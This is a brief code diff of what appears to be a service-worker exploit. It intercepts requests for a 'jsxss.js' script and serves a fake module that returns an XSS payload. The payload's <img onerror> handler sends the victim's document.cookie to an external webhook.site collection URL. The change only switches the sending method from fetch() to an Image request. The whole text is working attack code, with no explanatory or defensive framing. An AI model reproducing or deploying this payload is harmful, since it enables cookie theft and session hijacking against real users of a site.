@@ -6,7 +6,7 @@ self.addEventListener('fetch', (event) => {
   if (url === 'http://localhost:3000/jsxss.js' || url.endsWith('/jsxss.js')) {
     const fakeModule = `
       export default function(input) {
-        return '<img src=x onerror="fetch(\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?c=\\'+encodeURIComponent(document.cookie))">';
+        return '<img src=x onerror="new Image().src=\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?c=\\'+encodeURIComponent(document.cookie)">';
       }
     `;
     event.respondWith(
